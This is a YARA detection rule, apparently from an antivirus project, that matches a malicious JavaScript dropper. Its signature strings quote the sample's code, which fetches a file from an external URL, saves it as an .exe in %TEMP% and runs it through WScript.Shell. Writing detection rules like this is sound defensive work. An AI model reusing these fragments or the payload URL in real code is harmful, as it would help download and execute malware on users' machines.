rule sig_20160328_55e89808700ab5d32d4c51d70ad620d7 {
  meta:
    description = "datamaliciousorder - file 20160328_55e89808700ab5d32d4c51d70ad620d7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c5353b346cbf54536ce259d52da4708e480d2d52db1f86b5fd29efb65284f641"

  strings:
    $s1  = "function Hzinalxbp() {return Guqwdedyj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"P03RSqydoVezH.exe\";};" fullword ascii
    $s2  = "Yylyx[Grwgrhev](\"GET\", \"http://baskinandbraw.com/wo8pfd\", false);" fullword ascii
    $s3  = "do {WScript[Arkqjgo](Psboc() * 11)} while (Yylyx[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Guqwdedyj = function Mguwnwho() {return WScript[Fgobltr](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Igsext(Cyzgnawj, Setfix){return Cyzgnawj - Setfix;};" fullword ascii
    $s6  = "function Pdeyctuze() {return ((Diwvrnkb == true) && (Diwvrnkb == Yrgjzdjemj)) ? 1 : Gqfpwuv;};" fullword ascii
    $s7  = "function Ucnhgrdjvv(Rvrvucuiv){Guqwdedyj[\"Run\"](Rvrvucuiv, Gqfpwuv, Gqfpwuv);};" fullword ascii
    $s8  = "Yrgjzdjemj = true; " fullword ascii
    $s9  = "return Igsext(Tufoq, Bjpnbfediw);" fullword ascii
    $s10 = "var Diwvrnkb = false;" fullword ascii
    $s11 = "function Gxebvsawu(){return Fgobltr;};" fullword ascii
    $s12 = "function Emjrjya(Mtgmlpbey) {var Upucqquy = (1, 2, 3, 4, 5, Mtgmlpbey); return Upucqquy;};" fullword ascii
    $s13 = "var Yrgjzdjemj = false;" fullword ascii
    $s14 = " while (Dsyrkgt){" fullword ascii
    $s15 = "function Adzqlkj()" fullword ascii
    $s16 = "function Nogba(){return Cpvqvlxqoj;};" fullword ascii
    $s17 = "var Wkaqylgh = false;" fullword ascii
    $s18 = "Diwvrnkb = true; " fullword ascii
    $s19 = "var Nrqnfzul = new this[\"Date\"]();" fullword ascii
    $s20 = "function Psboc(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}